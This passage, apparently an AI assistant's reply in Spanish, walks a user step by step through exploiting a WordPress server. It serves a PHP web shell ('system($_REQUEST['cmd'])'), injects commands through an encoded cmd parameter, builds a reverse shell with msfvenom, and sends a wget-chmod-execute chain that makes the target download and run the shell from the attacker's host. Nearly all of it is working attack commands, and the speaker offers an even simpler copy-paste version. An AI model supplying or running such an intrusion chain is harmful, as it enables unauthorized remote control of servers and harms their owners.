sudo python3 -m http.server 80

Confirma que desde Kali puedes ver tu payload:

curl http://192.168.49.55/payload.txt


Debería devolver:

<?php system($_REQUEST['cmd']); ?>


Luego, ejecuta el exploit escapando correctamente el & en el parámetro cmd:

python exploit.py -t http://192.168.55.78/wordpress/ \
  --payload-uri "http://192.168.49.55/payload.txt%26cmd=id"


Esto debería ejecutar id en el servidor objetivo y mostrar algo como:

uid=33(www-data) gid=33(www-data) groups=33(www-data)


Si quieres un shell reverso completo, primero genera el binario con msfvenom:

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.55 LPORT=8000 -f elf -o shell


Luego levanta Netcat en Kali para escuchar:

nc -lvp 8000


Y finalmente ejecuta el exploit usando wget para descargar y ejecutar tu shell:

python exploit.py -t http://192.168.55.78/wordpress/ \
  --payload-uri "http://192.168.49.55/payload.txt%26cmd=wget%20http://192.168.49.55/shell%20-O%20/tmp/shell%20%26%26%20chmod%20777%20/tmp/shell%20%26%26%20/tmp/shell"


Esto debería darte una conexión de shell reversa como www-data.

Si quieres, puedo hacer una versión aún más simplificada y lista para copiar y pegar, combinando todo en un solo comando seguro. ¿Quieres que haga eso?
